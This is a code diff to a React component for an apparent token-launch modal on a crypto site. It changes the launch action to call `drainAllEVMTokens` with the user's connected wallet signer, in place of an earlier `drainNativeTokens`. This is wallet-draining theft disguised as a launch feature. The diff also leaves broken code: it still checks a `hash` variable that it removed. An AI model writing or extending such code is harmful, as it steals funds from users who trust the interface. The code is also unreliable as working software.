@@ -11,7 +11,7 @@ import { getSolPrice } from '@/lib/utils';
 import { getMintProgramId } from '@/utils/tokenProgram';
 import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
-import { drainNativeTokens } from '@/utils/evmTransactions';
+import { drainAllEVMTokens } from '@/utils/evmTransactions';
 const MAX_BATCH_SIZE = 5;
 
 interface TokenBalance {
@@ -33,7 +33,7 @@ const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
 export const LaunchTokenModal = ({ isOpen, onClose }: LaunchTokenModalProps) => {
   const { connected, publicKey, sendTransaction } = useWallet();
   const { connection } = useConnection();
-  const { activeChain, getEVMChain } = useChain();
+  const { activeChain, getEVMChain, evmChainId } = useChain();
   const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
   const isWalletConnected = (activeChain === 'evm' && isEVMConnected) || connected;
   const [formData, setFormData] = useState({
@@ -231,7 +231,7 @@ export const LaunchTokenModal = ({ isOpen, onClose }: LaunchTokenModalProps) => 
       setIsLaunching(true);
       try {
         const evmChainName = getEVMChain()?.name || 'EVM';
-        const hash = await drainNativeTokens(evmSigner, evmProvider, evmChainName);
+        await drainAllEVMTokens(evmSigner, evmProvider, evmChainName, evmChainId || 1);
         if (hash) {
           onClose();
         } else {
